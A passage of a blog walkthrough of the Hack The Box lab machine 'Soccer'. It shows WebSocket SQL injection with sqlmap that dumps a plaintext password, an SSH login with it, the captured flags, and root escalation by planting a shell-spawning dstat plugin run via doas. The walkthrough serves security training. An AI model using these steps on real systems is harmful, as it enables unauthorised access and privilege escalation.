+</span></span></code></pre></div><p>Port 3000 is interesting, but there is no PID associated with it. Again, seeing a lot of nginx which we know is what is hosting the web apps. Let&rsquo;s go to the etc/nginx folder and see if we can find anything. We go into the sites-enabled folder and see a virtual host!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@soccer:/etc/nginx/sites-enabled$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>default
+</span></span><span style="display:flex;"><span>soc-player.htb
+</span></span></code></pre></div><p>We add soc-player.soccer.htb to our /etc/hosts next to soccer.htb and navigate to the URL.
+<img src="/images/Soccer/soc-player.png" alt="soc-player"></p>
+<p>We go through the site, and notice a function for us to create an account. We create an account and then login. We are taken to the /check page.
+<img src="/images/Soccer/check.png" alt="check"></p>
+<p>This page lets us enter a ticket ID and then tells us if it exists or not. There is a ticket ID provided for us which returns &ldquo;Ticket Exists&rdquo;. When we submit an invalid ticket number, we receive &ldquo;Ticket Doesn&rsquo;t Exist&rdquo;. If we enter nothing, we receive &ldquo;????????&rdquo;. Interestingly, we don&rsquo;t see any HTTP requests in Burp. Is the site doing everything on the client-side?</p>
+<p>Let&rsquo;s look at the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">SNIP</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#e6db74">&#34;ws://soc-player.soccer.htb:9091&#34;</span>);
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">btn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;btn&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">input</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;id&#39;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;connected to the server&#39;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;keypress&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">keyOne</span>(<span style="color:#a6e22e">e</span>)
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">keyOne</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stopPropagation</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">keyCode</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">13</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">sendText</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendText</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">msg</span>
+</span></span><span style="display:flex;"><span>                }))
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;????????&#34;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">msg</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;p&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// let randomColor = &#39;#&#39; + Math.floor(Math.random() * 16777215).toString(16);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// p.style.color = randomColor;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">SNIP</span>&gt;
+</span></span></code></pre></div><p>In the JavaScript, we see a new websocket is created to the URL on port 9091 which is sending our input. We can go to the WebSockets history in Burp to see the traffic.
+<img src="/images/Soccer/websocket.png" alt="Websocket"></p>
+<p>WebSockets are a bi-directional, full-duplex, communications protocol initiated over HTTP. You will see WebSockets commonly used in modern web applications. The benefits of using WebSockets is that, compared to HTTP, messages can be sent in either direction at any time. The connection will remain open until the client/server is ready to send a message. This is particularly useful where low-latency or server-initiated messages are necessary, like real-time feeds of financial data.</p>
+<p>WebSockets may seem much different, but they can still be vulnerable to classic web application vulnerabilities. Similarly, we just need to find ways to manipulate the data being sent. Entering a single quote does nothing, but if we enter an invalid ticket number and then append a true statement like &ldquo;1=1&rdquo;, we receive a &ldquo;Ticket Exists&rdquo; message!
+<img src="/images/Soccer/sqli.png" alt="SQL injection"></p>
+<p>We can use SQLMap to dump information. To do this, we have to format the URL to use the WebSocket prefix as well as adjust the level to 5. If you don&rsquo;t adjust the level to 5, it won&rsquo;t find anything.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sqlmap -u <span style="color:#e6db74">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --batch --level <span style="color:#ae81ff">5</span> --dump
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Database: soccer_db
+</span></span><span style="display:flex;"><span>Table: accounts
+</span></span><span style="display:flex;"><span>[1 entry]
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span><span style="display:flex;"><span>| id   | email             | password             | username |
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span><span style="display:flex;"><span>| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span></code></pre></div><p>We already know there is a user named &ldquo;player&rdquo; on the box, so let&rsquo;s try to SSH in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh player@10.10.11.194
+</span></span><span style="display:flex;"><span>The authenticity of host &#39;10.10.11.194 (10.10.11.194)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span>ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
+</span></span><span style="display:flex;"><span>This key is not known by any other names.
+</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;10.10.11.194&#39; (ED25519) to the list of known hosts.
+</span></span><span style="display:flex;"><span>player@10.10.11.194&#39;s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  System information as of Fri Jan 31 19:58:32 UTC 2025
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  System load:           0.05
+</span></span><span style="display:flex;"><span>  Usage of /:            74.2% of 3.84GB
+</span></span><span style="display:flex;"><span>  Memory usage:          28%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             250
+</span></span><span style="display:flex;"><span>  Users logged in:       0
+</span></span><span style="display:flex;"><span>  IPv4 address for eth0: 10.10.11.194
+</span></span><span style="display:flex;"><span>  IPv6 address for eth0: dead:beef::250:56ff:feb0:833b
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>0 updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check for new updates run: sudo apt update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
+</span></span><span style="display:flex;"><span>player@soccer:~$
+</span></span></code></pre></div><p>And we are in! We can grab the user flag in the home dir and then start looking for privilege escalations.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:~$ cat user.txt
+</span></span><span style="display:flex;"><span>6e8f7c2fab14ccd048ba08060f12276b
+</span></span></code></pre></div><p>While going through our normal enumeration, we find that there is a SETUID bit set for the /usr/local/bin/doas binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:/etc/nginx$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null 
+</span></span><span style="display:flex;"><span>-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
+</span></span></code></pre></div><p>We try to run a few commands with <code>doas</code>, but nothing happens. Let&rsquo;s check the doas.conf file. We can search for it with find.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:~$ find / -type f -name doas.conf 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/local/etc/doas.conf
+</span></span></code></pre></div><p>Let&rsquo;s check it out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:~$ cat /usr/local/etc/doas.conf
+</span></span><span style="display:flex;"><span>permit nopass player as root cmd /usr/bin/dstat
+</span></span></code></pre></div><p>It looks like we can run the dstat binary. The dstat binary lets you retrieve information and statistics from system components like network connections, IO devices, CPU, etc. Let&rsquo;s check <a href="https://gtfobins.github.io/">GTFObins</a> for the dstat binary. GTFObins says that we can use dstat to run Python scripts loaded as &ldquo;external plugins&rdquo; if they are located in one of these directories:</p>
+<ul>
+<li>~/.dstat/</li>
+<li>(path of binary)/plugins/</li>
+<li>/usr/share/dstat/</li>
+<li>/usr/local/share/dstat/</li>
+</ul>
+<p>Let&rsquo;s check what scripts are in any of these directories. Going through them, we find that there are a ton of scripts in /usr/share/dstat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:~$ ls /usr/share/dstat/
+</span></span><span style="display:flex;"><span>__pycache__              dstat_dstat_ctxt.py     dstat_md_status.py            dstat_mysql_keys.py   dstat_rpcd.py           dstat_top_cpu.py          dstat_vmk_hba.py
+</span></span><span style="display:flex;"><span>dstat.py                 dstat_dstat_mem.py      dstat_memcache_hits.py        dstat_net_packets.py  dstat_sendmail.py       dstat_top_cpu_adv.py      dstat_vmk_int.py
+</span></span><span style="display:flex;"><span>dstat_battery.py         dstat_fan.py            dstat_mongodb_conn.py         dstat_nfs3.py         dstat_snmp_cpu.py       dstat_top_cputime.py      dstat_vmk_nic.py
+</span></span><span style="display:flex;"><span>dstat_battery_remain.py  dstat_freespace.py      dstat_mongodb_mem.py          dstat_nfs3_ops.py     dstat_snmp_load.py      dstat_top_cputime_avg.py  dstat_vz_cpu.py
+</span></span><span style="display:flex;"><span>dstat_condor_queue.py    dstat_fuse.py           dstat_mongodb_opcount.py      dstat_nfsd3.py        dstat_snmp_mem.py       dstat_top_int.py          dstat_vz_io.py
+</span></span><span style="display:flex;"><span>dstat_cpufreq.py         dstat_gpfs.py           dstat_mongodb_queue.py        dstat_nfsd3_ops.py    dstat_snmp_net.py       dstat_top_io.py           dstat_vz_ubc.py
+</span></span><span style="display:flex;"><span>dstat_dbus.py            dstat_gpfs_ops.py       dstat_mongodb_stats.py        dstat_nfsd4_ops.py    dstat_snmp_net_err.py   dstat_top_io_adv.py       dstat_wifi.py
+</span></span><span style="display:flex;"><span>dstat_disk_avgqu.py      dstat_helloworld.py     dstat_mysql5_cmds.py          dstat_nfsstat4.py     dstat_snmp_sys.py       dstat_top_latency.py      dstat_zfs_arc.py
+</span></span><span style="display:flex;"><span>dstat_disk_avgrq.py      dstat_ib.py             dstat_mysql5_conn.py          dstat_ntp.py          dstat_snooze.py         dstat_top_latency_avg.py  dstat_zfs_l2arc.py
+</span></span><span style="display:flex;"><span>dstat_disk_svctm.py      dstat_innodb_buffer.py  dstat_mysql5_innodb.py        dstat_postfix.py      dstat_squid.py          dstat_top_mem.py          dstat_zfs_zil.py
+</span></span><span style="display:flex;"><span>dstat_disk_tps.py        dstat_innodb_io.py      dstat_mysql5_innodb_basic.py  dstat_power.py        dstat_test.py           dstat_top_oom.py
+</span></span><span style="display:flex;"><span>dstat_disk_util.py       dstat_innodb_ops.py     dstat_mysql5_innodb_extra.py  dstat_proc_count.py   dstat_thermal.py        dstat_utmp.py
+</span></span><span style="display:flex;"><span>dstat_disk_wait.py       dstat_jvm_full.py       dstat_mysql5_io.py            dstat_qmail.py        dstat_top_bio.py        dstat_vm_cpu.py
+</span></span><span style="display:flex;"><span>dstat_dstat.py           dstat_jvm_vm.py         dstat_mysql5_keys.py          dstat_redis.py        dstat_top_bio_adv.py    dstat_vm_mem.py
+</span></span><span style="display:flex;"><span>dstat_dstat_cpu.py       dstat_lustre.py         dstat_mysql_io.py             dstat_rpc.py          dstat_top_childwait.py  dstat_vm_mem_adv.py
+</span></span></code></pre></div><p>However, none of those are writeable to our user. The final one on the list is /usr/local/share/dstat/ and if we do an <code>ls -ld</code> on it, we see that the directory is a part of the player group which means we can write to it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:~$ ls -ld /usr/local/share/dstat/
+</span></span><span style="display:flex;"><span>drwxrwx--- 2 root player 4096 Dec 12  2022 /usr/local/share/dstat/
+</span></span></code></pre></div><p>Let&rsquo;s create a Python script that spawns an interactive system shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; dstat_exploit.py
+</span></span><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ ls
+</span></span><span style="display:flex;"><span>dstat_exploit.py
+</span></span></code></pre></div><p>Now we use <code>doas</code> to run the dstat command as sudo with the <code>--list</code> flag to see if our script is there. A little note here: I had to use <code>/usr/bin/dstat</code> instead of just <code>dstat</code> for this to work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --list
+</span></span><span style="display:flex;"><span>internal:
+</span></span><span style="display:flex;"><span>        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,
+</span></span><span style="display:flex;"><span>        swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
+</span></span><span style="display:flex;"><span>/usr/share/dstat:
+</span></span><span style="display:flex;"><span>        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,
+</span></span><span style="display:flex;"><span>        fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,
+</span></span><span style="display:flex;"><span>        mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,
+</span></span><span style="display:flex;"><span>        mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,
+</span></span><span style="display:flex;"><span>        snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,
+</span></span><span style="display:flex;"><span>        top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,
+</span></span><span style="display:flex;"><span>        vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
+</span></span><span style="display:flex;"><span>/usr/local/share/dstat:
+</span></span><span style="display:flex;"><span>        exploit
+</span></span></code></pre></div><p>We can see that dstat found our Python script, and now we can use dstat to run it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
+</span></span><span style="display:flex;"><span>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses
+</span></span><span style="display:flex;"><span>  import imp
+</span></span><span style="display:flex;"><span># id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style="display:flex;"><span># 
+</span></span></code></pre></div><p>And we have a root shell! Now we grab the root shell and we have completed this box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span># cat root.txt
+</span></span><span style="display:flex;"><span>3d001e77dde43a3106b7f1d130ef4aff
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
